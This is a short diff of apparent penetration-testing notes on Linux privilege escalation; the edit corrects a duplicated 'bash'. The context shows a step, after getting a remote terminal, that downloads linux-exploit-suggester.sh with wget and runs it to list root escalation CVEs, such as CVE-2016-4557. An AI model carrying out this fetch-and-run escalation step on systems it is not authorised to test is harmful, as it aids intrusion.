@@ -136,7 +136,7 @@ sudo -i
    # Method 2
    # once we obtain a terminal on the remote, we can run the linux-exploit-suggester.sh
    wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh && \
-     bash bash linux-exploit-suggester.sh
+     bash linux-exploit-suggester.sh
    # This will give us root escalation methods for the current distro (e.g. C programs which can be compiled)
    ```bash
        [+] [CVE-2016-4557] double-fdput()
